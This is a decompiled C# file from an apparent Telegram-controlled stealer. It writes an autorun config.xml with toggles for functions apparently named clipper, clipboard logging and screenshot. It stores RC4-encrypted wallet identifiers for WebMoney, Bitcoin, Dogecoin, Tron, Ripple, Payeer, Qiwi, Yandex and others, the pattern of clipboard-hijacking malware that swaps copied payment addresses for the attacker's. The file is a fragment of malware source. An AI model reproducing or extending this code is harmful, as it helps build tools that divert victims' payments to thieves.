using System;
using System.Xml;

namespace TelegramBot
{
	// Token: 0x02000012 RID: 18
	internal class Create
	{
		// Token: 0x0600004F RID: 79 RVA: 0x000043E0 File Offset: 0x000025E0
		public static void CreateCfg()
		{
			using (XmlWriter xmlWriter = XmlWriter.Create(Commands.directory + "config.xml"))
			{
				xmlWriter.WriteStartElement("autorun");
				xmlWriter.WriteStartElement("func");
				xmlWriter.WriteAttributeString("name", "Clp");
				xmlWriter.WriteElementString("value", Commands.Clp.ToString());
				if (!string.IsNullOrEmpty(Purse.wmr))
				{
					xmlWriter.WriteElementString("wmr", RC4.Encrypt(Purse.wmr, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.wmz))
				{
					xmlWriter.WriteElementString("wmz", RC4.Encrypt(Purse.wmz, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.wme))
				{
					xmlWriter.WriteElementString("wme", RC4.Encrypt(Purse.wme, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.wmx))
				{
					xmlWriter.WriteElementString("wmx", RC4.Encrypt(Purse.wmx, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.btc))
				{
					xmlWriter.WriteElementString("btc", RC4.Encrypt(Purse.btc, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.cc))
				{
					xmlWriter.WriteElementString("cc", RC4.Encrypt(Purse.cc, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.btcg))
				{
					xmlWriter.WriteElementString("btcg", RC4.Encrypt(Purse.btcg, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.dogechain))
				{
					xmlWriter.WriteElementString("dogechain", RC4.Encrypt(Purse.dogechain, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.tron))
				{
					xmlWriter.WriteElementString("tron", RC4.Encrypt(Purse.tron, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.payeer))
				{
					xmlWriter.WriteElementString("payeer", RC4.Encrypt(Purse.payeer, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.ripple))
				{
					xmlWriter.WriteElementString("ripple", RC4.Encrypt(Purse.ripple, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.yd))
				{
					xmlWriter.WriteElementString("yd", RC4.Encrypt(Purse.yd, ClipboardEx.UNICODETEXT));
				}
				if (!string.IsNullOrEmpty(Purse.qiwi))
				{
					xmlWriter.WriteElementString("qiwi", RC4.Encrypt(Purse.qiwi, ClipboardEx.UNICODETEXT));
				}
				xmlWriter.WriteEndElement();
				xmlWriter.WriteStartElement("func");
				xmlWriter.WriteAttributeString("name", "Cbl");
				xmlWriter.WriteElementString("value", Commands.Cbl.ToString());
				xmlWriter.WriteEndElement();
				xmlWriter.WriteStartElement("func");
				xmlWriter.WriteAttributeString("name", "Scr");
				xmlWriter.WriteElementString("value", Commands.Scr.ToString());
				xmlWriter.WriteEndElement();
				xmlWriter.WriteEndDocument();
				xmlWriter.Flush();
			}
		}
	}
}
